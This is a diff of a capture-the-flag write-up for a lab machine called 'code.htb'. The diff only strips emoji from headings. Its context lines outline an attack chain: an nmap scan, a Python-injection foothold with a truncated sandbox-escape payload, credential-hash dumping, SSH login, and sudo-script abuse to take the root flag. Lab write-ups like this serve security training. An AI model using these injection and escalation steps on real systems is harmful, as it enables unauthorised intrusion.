@@ -8,7 +8,7 @@ Hints: True
 
 
 
-## ✅ Summary
+##  Summary
 
 | Step | User / Access | Technique Used              | Result                                                                                            |
 | :--- | :------------ | :-------------------------- | :------------------------------------------------------------------------------------------------ |
@@ -22,7 +22,7 @@ Hints: True
 ---
 
 
-## 🔍 Nmap Scan
+##  Nmap Scan
 
 ```bash
 nmap code.htb -sV -A
@@ -36,7 +36,7 @@ PORT     STATE SERVICE VERSION
 
 ---
 
-## 🧱 Initial Foothold: SSTI Injection
+## Initial Foothold: SSTI Injection
 
 * A Python code editor web app was running on port `5000`.
 * Discovered SSTI vulnerability allowing Python code injection.
@@ -57,7 +57,7 @@ print(''.__class__.__bases__[0].__subclasses__()[80].__init__.__globals__['__bui
 
 ---
 
-## 👤 Privilege Escalation Part 1: User Enumeration & Credential Dumping
+##  Privilege Escalation Part 1: User Enumeration & Credential Dumping
 
 * Discovered a `database.db` file in `/app/instance/`.
 * Extracted a password hash for user `martin`.
@@ -72,7 +72,7 @@ Recovered password for `martin`.
 
 ---
 
-## 👨‍💻 User Access: SSH Login
+##  User Access: SSH Login
 
 ```bash
 ssh martin@code.htb
@@ -82,7 +82,7 @@ ssh martin@code.htb
 
 ---
 
-## ⚡ Privilege Escalation Part 2: Sudo Script Exploitation
+## Privilege Escalation Part 2: Sudo Script Exploitation
 
 * Checked sudo permissions:
 
@@ -117,7 +117,7 @@ sudo /usr/bin/backy.sh task.json
 
 ---
 
-## 🏆 Root Flag Retrieval
+##  Root Flag Retrieval
 
 After the script ran, obtained `root.txt` from the backup in `/tmp`.
 
